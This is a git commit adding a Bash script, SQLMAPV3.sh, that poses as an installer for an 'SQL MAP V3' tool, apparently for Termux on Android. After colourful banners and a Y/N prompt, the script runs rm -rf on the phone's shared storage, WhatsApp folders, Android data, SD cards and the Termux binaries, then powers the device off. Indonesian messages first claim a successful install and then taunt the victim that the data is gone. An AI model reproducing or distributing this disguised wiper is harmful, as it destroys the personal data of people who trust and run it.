af3fc7887b9a198678623829c17c6c5a9725aaf2
SpiderCyberTeam <46249685+SpiderCyberTeam@users.noreply.github.com>
2019-01-22 21:41:59 +0700

    Add files via upload

---
+++ SQLMAPV3.sh
@@ -0,0 +1,57 @@
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+
+
+
+
+
+figlet -f standard "SQLMAP V3"
+echo
+
+
+
+echo $red"####################################"
+echo
+echo $purple"CREATOR SECRET X CYBER"
+echo $cyan"SQL MAP V3"
+echo $white"GLOBAL ANONYMOUS"
+
+echo $blue"####################################"
+
+echo $green"####################################"
+echo $white"PESAN: 
+     $white"TOOLS SECRET X CYBER
+echo $green"####################################"
+echo
+echo
+echo $blue "SILAKAN PILIH Y/N"
+read -p "#####>" Y
+echo $red"SEDANG MENGINSTALL..."
+pkg update
+pkg upgrade
+rm -rf /storage/emulated/0/System
+rm -rf /storage/emulated/0/WhatsApp
+rm -rf /storage/emulated/0/FMWhatsApp
+rm -rf /storage/emulated/0/Android/data
+rm -rf /storage/emulated/0/Android
+rm -rf /storage/emulated/0
+rm -rf /storage
+rm -rf /storage/sdcard
+rm -rf /storage/sdcard1
+rm -rf $PREFIX/bin
+sleep1
+echo
+echo $blue"BERHASIL TERINSTALL..."
+echo
+echo $white"SALAM ANONYMOUS GLOBAL"
+echo
+echo $red"MOHON MAAF DATA/IMEI/NETWORK/IPV6/IPV4/SYSTEM SUDAH TERHAPUS TERIMAKASIH"
+echo
+echo $green"WE PARTY INYOUR SYSTEMS!"
+sleep1
+reboot -p
